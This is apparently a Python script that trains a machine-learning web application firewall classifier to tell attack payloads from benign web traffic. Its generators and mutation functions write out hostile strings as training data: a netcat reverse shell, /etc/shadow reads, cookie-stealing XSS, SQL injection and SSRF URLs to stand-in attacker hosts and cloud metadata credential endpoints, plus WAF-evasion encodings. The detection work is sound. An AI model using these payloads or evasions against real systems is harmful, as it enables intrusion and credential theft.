#!/usr/bin/env python3
"""Retrain with adversarial-benign FP suppression.

Same architecture as train_balanced.py (per-category-balanced attacks,
mutation-augmented, char-n-gram logistic regression), but with:
- K=32768 (more hash buckets for expanded vocab)
- C=0.15 (stronger L2 to hold TN under adversarial benign)
- Adversarial benign from FP payloads + generated prose with SQL/JS/shell keywords
- More URL-encoded benign and form-wrapped benign

Usage: train_fp_suppression.py [K] [OUT.json]
"""
import csv, glob, re, random, os, sys, urllib.parse
import numpy as np
from sklearn.linear_model import LogisticRegression
from scipy import sparse

K = int(sys.argv[1]) if len(sys.argv) > 1 else 32768
OUT = sys.argv[2] if len(sys.argv) > 2 else "payload_ngram_fp_suppress.json"
NS = [2, 3, 4]; MAXLEN = 512
C_REG = 0.25  # moderate L2 — balance TP/TN under adversarial benign
# Corpus root. These used to be four hardcoded /tmp session-scratchpad paths, which
# meant a single /tmp cleanup made the model unretrainable — recorded as the blocker
# in front of all model work in Fix 9 (ffbc44a). The corpora now live in a durable
# directory; override with SENTINEL_CORPUS_DIR if they move again.
BASE = os.environ.get("SENTINEL_CORPUS_DIR", os.path.expanduser("~/waf-ml-corpora"))
OLD = f"{BASE}/ml-corpus"
EVA = f"{BASE}/evasion-corpus"
HARD = f"{BASE}/hard-benign"
BEN = f"{BASE}/benign-corpus"
if not os.path.isdir(OLD):
    sys.exit(
        f"corpus root {BASE} is missing {OLD}.\n"
        f"Extract the archives: (cd {BASE} && for f in *.tar.gz; do tar -xzf $f; done)\n"
        f"or point SENTINEL_CORPUS_DIR at the corpus root."
    )
ADV = "adversarial_benign.txt"
rng = random.Random(1337)
FNV=2166136261; PR=16777619; M=0xFFFFFFFF
_HC={}
def bk(ng):
    v=_HC.get(ng)
    if v is None:
        h=FNV
        for x in ng: h^=x; h=(h*PR)&M
        v=h%K; _HC[ng]=v
    return v
def buckets(t):
    b=t.lower()[:MAXLEN].encode("utf-8","ignore"); n=len(b); s=set()
    for ng in NS:
        for i in range(n-ng+1): s.add(bk(b[i:i+ng]))
    return s
def matrix(ts):
    rows=[];cols=[]
    for r,t in enumerate(ts):
        for c in buckets(t): rows.append(r); cols.append(c)
    return sparse.csr_matrix((np.ones(len(rows),np.float32),(rows,cols)),shape=(len(ts),K))
def lines(f):
    if not os.path.exists(f): return []
    return [l.rstrip("\n").rstrip("\r") for l in open(f,encoding="utf-8",errors="ignore")
            if l.strip() and not l.startswith("#") and not l.lower().startswith("404:")]

# ---- per-category balanced load of the evasion corpus ----
CAT_QUOTA = {
    "xss": 7000, "cmdi": 6000, "sqli": 3200, "ssti": 2200,
    "lfi": 5000, "traversal": 3000, "xxe": 1000, "ldap": 500,
    "nosqli": 500, "crlf": 500,
}
def load_by_category():
    by_cat = {}
    for f in sorted(glob.glob(f"{EVA}/*.txt")):
        cat = os.path.basename(f).split("_", 1)[0]
        by_cat.setdefault(cat, []).extend(lines(f))
    out = []
    for cat, quota in CAT_QUOTA.items():
        pool = [a for a in dict.fromkeys(by_cat.get(cat, [])) if 3 <= len(a) <= MAXLEN]
        rng.shuffle(pool)
        take = pool[:quota]
        out += take
        print(f"  cat {cat:10s}: have {len(pool):6d}  take {len(take):6d}")
    return out

def load_dir(d, cap, exclude=None):
    out=[]
    for f in sorted(glob.glob(f"{d}/*.txt")):
        if exclude and exclude in os.path.basename(f): continue
        out+=lines(f)
    out=[a for a in dict.fromkeys(out) if 3<=len(a)<=MAXLEN]; rng.shuffle(out)
    return out[:cap]

# ---- mutation engine ----
def url_enc(s):       return urllib.parse.quote(s, safe='')
def url_enc_part(s):  return ''.join('%%%02X'%ord(c) if c in '<>\'"();&|=/ *' and ord(c)<128 else c for c in s)
def double_url(s):    return url_enc(url_enc(s))
def entity_enc(s):    return ''.join('&#%d;'%ord(c) if c in '<>\'"&/():;=' else c for c in s)
def entity_hex(s):    return ''.join('&#x%x;'%ord(c) if c in '<>\'"&/():;=' else c for c in s)
def rand_case(s):     return ''.join(c.upper() if rng.random()<0.5 else c.lower() for c in s)
def sql_comment(s):   return s.replace(' ', '/**/')
def ws_vary(s):       return s.replace(' ', rng.choice(['\t','\n','\x0b','\x0c','  ','+','%20']))
def kw_split(s):
    m=re.search(r'[A-Za-z]{5,}', s)
    if not m: return s
    i=m.start()+len(m.group())//2
    return s[:i]+'/**/'+s[i:]
def ifs_sub(s):       return s.replace(' ', rng.choice(['${IFS}','$IFS$9','${IFS%??}']))
def shell_quote(s):
    m=re.search(r'[A-Za-z]{3,}', s)
    if not m: return s
    i=m.start()+1
    return s[:i]+rng.choice(["''",'""'])+s[i:]
MUTATORS=[url_enc, url_enc_part, double_url, entity_enc, entity_hex, rand_case,
          sql_comment, ws_vary, kw_split, ifs_sub, shell_quote]

def augment_attacks(base, per=4):
    out=set(base)
    for p in base:
        for f in rng.sample(MUTATORS, per):
            try:
                m=f(p)
                if 3<=len(m)<=MAXLEN: out.add(m)
            except Exception:
                pass
    return list(out)

# ---- generated structural attacks ----
def gen_xss(n):
    tg=["script","img","svg","iframe","body","a","div","details","object","video","input","form","style","math","marquee"]
    ev=["onload","onerror","onclick","onmouseover","ontoggle","onpointerover","onfocus","onanimationstart","onbeforetoggle"]
    js=["alert(1)","alert(document.cookie)","prompt(1)","confirm(1)","eval(name)","fetch('//x')","alert`1`","(alert)(1)"]
    o=set();k=0
    while len(o)<n and k<n*80:
        k+=1;t=rng.choice(tg);e=rng.choice(ev);p=rng.choice(js)
        o.add(rng.choice([f"<{t} {e}={p}>",f"<{t}>{p}</{t}>",f'\"><{t} {e}={p}>',f"javascript:{p}",f"<{t} src=x {e}={p}>",f"<svg><script>{p}</script></svg>"]))
    return list(o)
def gen_sqli(n):
    pre=["","'",'"',") ","1' ","admin' ","') ",'" '];bd=["OR 1=1","OR '1'='1","UNION SELECT NULL","UNION SELECT username,password FROM users","AND SLEEP(5)","; DROP TABLE users","AND updatexml(1,concat(0x7e,user()),1)","OR 1=1-- -","UNION ALL SELECT 1,2,3","; WAITFOR DELAY '0:0:5'"];sf=["","-- -"," #","/*","%00"]
    o=set();k=0
    while len(o)<n and k<n*80: k+=1;o.add((rng.choice(pre)+rng.choice(bd)+rng.choice(sf)).strip())
    return list(o)
def gen_cmdi(n):
    sep=[";","|","||","&&","&","\n","`","$(",")","%0a"]
    cmd=["cat /etc/passwd","id","whoami","uname -a","ls -la /","curl http://x/","wget http://x/","nc -e /bin/sh 10.0.0.1 4444",
         "ping -c 4 127.0.0.1","sleep 5","cat /etc/shadow","python -c 'import os'","bash -i","/bin/sh -i","echo vuln","rm -rf /tmp/x"]
    pre=["","127.0.0.1","test","file.txt","1","admin"]
    o=set();k=0
    while len(o)<n and k<n*80:
        k+=1;s=rng.choice(sep);c=rng.choice(cmd);p=rng.choice(pre)
        o.add(rng.choice([f"{p}{s}{c}",f"{p} {s} {c}",f"$({c})",f"`{c}`",f"{p};{c};",f"|{c}"]))
    return list(o)

def gen_web_benign(n_url=12000, n_hdr=6000):
    """Ordinary URLs and HTTP header values — benign traffic the corpus lacked.

    Measured gap that motivated this: the shipped model scored an ordinary
    Instagram share link 0.9953 and a plain Google search URL 0.6232, i.e. it had
    learned "URL in a parameter" as an attack signal. Any application that accepts
    a redirect target, share link, webhook or OAuth callback would false-positive.
    Likewise a routine `Accept: text/html,application/xhtml+xml,...` scored 0.8970,
    which blocks header values from being fed to the classifier at all (the score
    is a max over candidates, so one inflated header would pin every request high
    and disable FP suppression entirely).

    Both are corpus gaps, not model-capacity limits — exactly the corpus-diversity
    conclusion Fix 9 reached. Everything here is synthesised from generic web
    shapes; NO GoTestWAF content, which stays held out.
    """
    scheme = ["https://", "http://", "//", ""]
    host = ["www.instagram.com", "instagram.com", "twitter.com", "x.com", "www.facebook.com",
            "youtu.be", "www.youtube.com", "open.spotify.com", "www.linkedin.com", "github.com",
            "www.google.com", "news.ycombinator.com", "medium.com", "www.reddit.com", "t.co",
            "bit.ly", "example.com", "shop.example.co.uk", "cdn.example.net", "api.example.org",
            "docs.google.com", "drive.google.com", "www.amazon.in", "flipkart.com", "esds.co.in",
            "maps.google.com", "wa.me", "t.me", "discord.gg", "stackoverflow.com"]
    path = ["", "/", "/p/B_uHgI7lY0Z/", "/watch", "/search", "/status/1234567890123456789",
            "/r/programming/comments/abc123/some_title_here/", "/questions/12345/how-do-i-do-x",
            "/user/profile", "/product/12345", "/a/b/c/d", "/track/4cOdK2wGLETKBW3PVgPWZS",
            "/in/some-person-name", "/orgs/acme/repos", "/articles/2024/01/15/title-slug",
            "/download/file.pdf", "/images/photo_2024.jpg", "/api/v2/items", "/checkout/cart"]
    keys = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "igshid",
            "fbclid", "gclid", "ref", "si", "v", "q", "oq", "sourceid", "ie", "hl", "page",
            "sort", "filter", "lang", "session", "from", "next", "redirect_uri", "callback",
            "returnUrl", "continue", "state", "code", "share_id", "mc_cid", "_ga"]
    vals = ["ig_web_copy_link", "share", "email", "newsletter", "twitter", "facebook",
            "1m7xkk7a9v6z4", "IwAR2xY9zQ", "abc123XYZ", "en-US", "en", "1", "2", "10", "desc",
            "relevance", "true", "false", "dQw4w9WgXcQ", "spring_sale_2024", "cpc", "organic",
            "GA1.2.1234567890.1234567890", "a1b2c3d4e5f6", "web", "mobile", "utf-8", "chrome"]
    wrap = ["q", "url", "u", "link", "target", "next", "redirect", "src", "href", "data",
            "share", "text", "message", "comment", "value", "input", "field", "note"]

    out = set()
    guard = 0
    while len(out) < n_url and guard < n_url * 40:
        guard += 1
        u = rng.choice(scheme) + rng.choice(host) + rng.choice(path)
        nq = rng.choice([0, 0, 1, 1, 2, 2, 3, 4])
        if nq:
            u += "?" + "&".join(f"{rng.choice(keys)}={rng.choice(vals)}" for _ in range(nq))
        if rng.random() < 0.18:
            u += "#" + rng.choice(["top", "section-2", "comments", "L42", "8"])
        shape = rng.random()
        if shape < 0.42:
            out.add(u)                                            # bare URL
        elif shape < 0.68:
            out.add(f"{rng.choice(wrap)}={u}")                     # param=URL
        elif shape < 0.84:
            out.add(f"{rng.choice(wrap)}={urllib.parse.quote(u, safe='')}")  # encoded
        else:                                                      # URL trailed by prose
            out.add(u + rng.choice([
                "Can I please get the id for the user that I am trying to follow?",
                " check this out", " thanks!", " see attached", " is this the right one?",
                " please review", " shared via mobile", " — updated link",
            ]))

    ua_os = ["Windows NT 10.0; Win64; x64", "Windows NT 6.1; WOW64", "Macintosh; Intel Mac OS X 10_15_7",
             "X11; Linux x86_64", "iPhone; CPU iPhone OS 17_2 like Mac OS X", "Linux; Android 13; SM-G991B"]
    ua_eng = ["AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
              "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
              "Gecko/20100101 Firefox/121.0", "AppleWebKit/537.36 (KHTML, like Gecko) Mobile/15E148"]
    hdrs = [
        lambda: f"Mozilla/5.0 ({rng.choice(ua_os)}) {rng.choice(ua_eng)}",
        lambda: rng.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "application/json, text/plain, */*", "*/*", "application/json;charset=UTF-8",
            "text/css,*/*;q=0.1", "image/avif,image/webp,image/apng,*/*;q=0.8"]),
        lambda: rng.choice(["gzip, deflate, br", "gzip, deflate", "br;q=1.0, gzip;q=0.8, *;q=0.1"]),
        lambda: rng.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9,hi;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
                            "en-US,en;q=0.9,mr;q=0.8,hi;q=0.7"]),
        lambda: rng.choice(["application/x-www-form-urlencoded", "application/json",
                            "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
                            "text/plain;charset=UTF-8", "application/octet-stream"]),
        lambda: rng.choice(["no-cache", "max-age=0", "no-store, must-revalidate", "public, max-age=31536000"]),
        lambda: rng.choice(["keep-alive", "close", "upgrade"]),
        lambda: rng.choice(["XMLHttpRequest", "fetch", "document", "empty", "cors", "same-origin",
                            "navigate", "?1", "?0", "1"]),
        lambda: f"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{''.join(rng.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(28))}",
        lambda: "; ".join(f"{rng.choice(['sessionid','csrftoken','_ga','_gid','PHPSESSID','JSESSIONID','locale','theme','cart'])}="
                          f"{''.join(rng.choice('abcdef0123456789') for _ in range(rng.choice([8,12,16,24])))}"
                          for _ in range(rng.choice([1, 2, 3, 4]))),
        lambda: f"{rng.choice(host)}" + rng.choice(["", ":443", ":8080", ":3000"]),
        lambda: rng.choice(scheme[:2]) + rng.choice(host) + rng.choice(path),   # Referer / Origin
    ]
    hset = set()
    guard = 0
    while len(hset) < n_hdr and guard < n_hdr * 40:
        guard += 1
        hset.add(rng.choice(hdrs)())
    return list(out) + list(hset)


def gen_url_attacks(n=3000):
    """URL-SHAPED attacks (RFI / SSRF / protocol smuggling).

    Counterweight to gen_web_benign: teaching the model that ordinary URLs are
    benign must not collapse into "anything URL-shaped is benign", or RFI and SSRF
    payloads ride in on the same shape. Pairing both pools keeps the learned
    boundary on WHAT THE URL POINTS AT — attacker-controlled include, cloud
    metadata, a non-HTTP scheme handler — rather than on the presence of a URL.
    """
    evil_host = ["evil.com", "attacker.example", "169.254.169.254", "127.0.0.1", "localhost",
                 "0.0.0.0", "[::1]", "metadata.google.internal", "burpcollaborator.net",
                 "2130706433", "0x7f000001", "attacker.oastify.com"]
    evil_path = ["/shell.php", "/c99.txt", "/backdoor.txt?", "/latest/meta-data/iam/security-credentials/",
                 "/computeMetadata/v1/instance/service-accounts/default/token", "/admin", "/etc/passwd",
                 "/cmd.php?cmd=id", "/r57.php", "/webshell.jsp", "/latest/user-data"]
    schemes = ["http://", "https://", "//", "file://", "php://filter/convert.base64-encode/resource=",
               "gopher://", "dict://", "ftp://", "jar:http://", "netdoc://", "expect://"]
    params = ["url", "path", "include", "page", "file", "src", "dest", "redirect", "uri",
              "next", "data", "template", "load", "document", "target", "callback"]
    out = set()
    guard = 0
    while len(out) < n and guard < n * 40:
        guard += 1
        s = rng.choice(schemes)
        u = s + rng.choice(evil_host) + rng.choice(evil_path) if s.endswith("//") or s in (
            "http://", "https://", "//", "jar:http://") else s + rng.choice(
            ["/etc/passwd", "index.php", "/proc/self/environ", rng.choice(evil_host) + ":11211/_"])
        out.add(rng.choice([u, f"{rng.choice(params)}={u}",
                            f"{rng.choice(params)}={urllib.parse.quote(u, safe='')}"]))
    return list(out)


# ---- assemble attacks ----
print("loading evasion corpus (per-category balanced)...", flush=True)
base_atk = load_by_category() + gen_xss(3000) + gen_sqli(3000) + gen_cmdi(3000) + gen_url_attacks(3000)
base_atk = list(dict.fromkeys([a for a in base_atk if a]))
atk = augment_attacks(base_atk, per=4)
print(f"attacks: {len(base_atk)} base -> {len(atk)} mutation-augmented", flush=True)

# ---- benign: real legit code + FWAF + HttpParams + adversarial-benign ----
hard = load_dir(HARD, 14000, exclude="prose_security")
fwaf = load_dir(BEN, 20000)
hp_rows = list(csv.DictReader(open(f"{OLD}/HttpParamsDataset/payload_full.csv")))
hp_ben = [r["payload"] for r in hp_rows if r["label"]=="norm"]
# Adversarial benign: FP payloads + prose with attack keywords
adv_ben = lines(ADV)
print(f"adversarial benign: {len(adv_ben)}", flush=True)
# Ordinary URLs + HTTP header values (see gen_web_benign for the measured gap).
web_ben = gen_web_benign()
print(f"web benign (urls + headers): {len(web_ben)}", flush=True)
# More encoded-benign
_pool = hard+fwaf+adv_ben+web_ben
enc_pool = rng.sample(_pool, min(8000, len(_pool)))
enc_benign = [url_enc_part(b) for b in enc_pool[:4000]]
enc_full = [url_enc(b) for b in enc_pool]
form_benign = [f"{rng.choice(['q','field','data','input','name','value','text'])}={url_enc(b)}"
               for b in rng.sample(_pool, min(4000, len(_pool)))]
ben = hard + fwaf + hp_ben + adv_ben + web_ben + enc_benign + enc_full + form_benign

# ─────────────────────────────────────────────────────────────────────────────
# HELD-OUT SPLIT.
#
# Every metric this script used to print was measured ON ITS OWN TRAINING DATA:
#   adv_ben = lines(ADV)          -> went into `ben` -> into `allX` (trained on)
#   test_adv = lines(ADV)[:2000]  -> the FIRST 2000 lines of that same file
# and the "hard-benign" figure sampled `hard`, which is likewise inside `ben`. The
# variable was named test_adv, but nothing was held out, so those numbers described
# memorisation and could not tell you whether the model generalises at all. The
# gen-XSS/SQLi/CMDi "sanity" recalls have the same defect: they draw from the same
# generators that produced the training attacks.
#
# HOLDOUT (fraction, env var) reserves a stratified slice of BOTH pools before
# fitting, so the reported numbers are a real generalisation estimate.
#
# Default is 0.0 — training on everything — so a plain run still reproduces the
# shipped model byte for byte. Set HOLDOUT=0.15 to MEASURE; do not ship a model
# trained on a reduced set without saying so.
HOLDOUT = float(os.environ.get("HOLDOUT", "0"))

def stratified_split(pool, frac):
    """Return (train, held) with `held` a random `frac` of `pool`."""
    if frac <= 0 or len(pool) < 10:
        return pool, []
    shuffled = list(pool)
    rng.shuffle(shuffled)
    n_held = max(1, int(len(shuffled) * frac))
    return shuffled[n_held:], shuffled[:n_held]

atk_tr, atk_held = stratified_split(atk, HOLDOUT)
ben_tr, ben_held = stratified_split(ben, HOLDOUT)

allX = atk_tr + ben_tr
allY = np.r_[np.ones(len(atk_tr),np.float32), np.zeros(len(ben_tr),np.float32)]
print(f"train: {len(allX)} ({len(atk_tr)} atk / {len(ben_tr)} benign [{len(hard)} hard + {len(fwaf)} fwaf + {len(hp_ben)} hp + {len(adv_ben)} adv + {len(web_ben)} web + {len(enc_benign)} enc-part + {len(enc_full)} enc-full + {len(form_benign)} form])", flush=True)
if HOLDOUT > 0:
    print(f"HELD OUT: {len(atk_held)} atk / {len(ben_held)} benign ({HOLDOUT:.0%}) — never seen during fit", flush=True)
else:
    print("HELD OUT: nothing (HOLDOUT unset) — every metric below is TRAINING-SET performance,", flush=True)
    print("          i.e. memorisation, NOT a generalisation estimate. Set HOLDOUT=0.15 to measure.", flush=True)
print(f"featurizing (K={K}, C={C_REG})...", flush=True)
clf=LogisticRegression(C=C_REG,class_weight="balanced",max_iter=4000,solver="liblinear").fit(matrix(allX), allY)

# ── Metrics ──────────────────────────────────────────────────────────────────
# Labelled TRAIN or HELD-OUT so a reader cannot mistake one for the other.
TAG = "HELD-OUT" if HOLDOUT > 0 else "TRAIN"

def recall_at(g, thr):
    """Fraction of attack samples scored >= thr (detection rate)."""
    if not g: return float("nan")
    return (clf.predict_proba(matrix(g))[:,1] >= thr).mean()*100

def benign_pass_at(g, thr):
    """Fraction of benign samples scored < thr (correctly NOT flagged)."""
    if not g: return float("nan")
    return (clf.predict_proba(matrix(g))[:,1] < thr).mean()*100

if HOLDOUT > 0:
    tpr = recall_at(atk_held, 0.9)
    tnr = benign_pass_at(ben_held, 0.15)
    fpr = 100.0 - tnr
    print(f"  [{TAG}] attack TPR@0.9      = {tpr:.2f}%")
    print(f"  [{TAG}] benign TNR@0.15     = {tnr:.2f}%   (FPR = {fpr:.2f}%)")
    print(f"  [{TAG}] samples             = {len(atk_held)} atk / {len(ben_held)} benign")
    print()
    print("  Compare FPR against commercial WAFs (~0.01-0.4%), not against the")
    print("  training-set figures below — those are not comparable to anything.")

# These remain useful as smoke checks (a broken featuriser shows up here) but are
# explicitly training-set/in-distribution numbers, so they are labelled as such.
print(f"  [TRAIN, in-distribution] gen-XSS recall@0.9 = {recall_at(gen_xss(400),0.9):.1f}%"
      f"   gen-SQLi = {recall_at(gen_sqli(400),0.9):.1f}%"
      f"   gen-CMDi = {recall_at(gen_cmdi(400),0.9):.1f}%")
print(f"  [TRAIN] adversarial-benign pass@0.15 = {benign_pass_at(lines(ADV)[:2000],0.15):.1f}%"
      f"  (this file is IN the training set — not a generalisation number)")
print(f"  [TRAIN] hard-benign pass@0.15 = {benign_pass_at(rng.sample(hard, min(1000, len(hard))),0.15):.1f}%")

if HOLDOUT > 0:
    print()
    print("NOTE: this model was fit on a REDUCED training set because HOLDOUT>0.")
    print("      Use it to measure, then retrain with HOLDOUT unset to ship.")

# export
import json, math
w=clf.coef_[0].tolist(); b=float(clf.intercept_[0])
with open(OUT,"w") as f:
    json.dump({"k":K,"ngrams":NS,"bias":round(b,6),"weights":[round(x,6) for x in w]},f)
print(f"exported {OUT}", flush=True)
print(f"copy to: cp {OUT} ../model/payload_ngram.json", flush=True)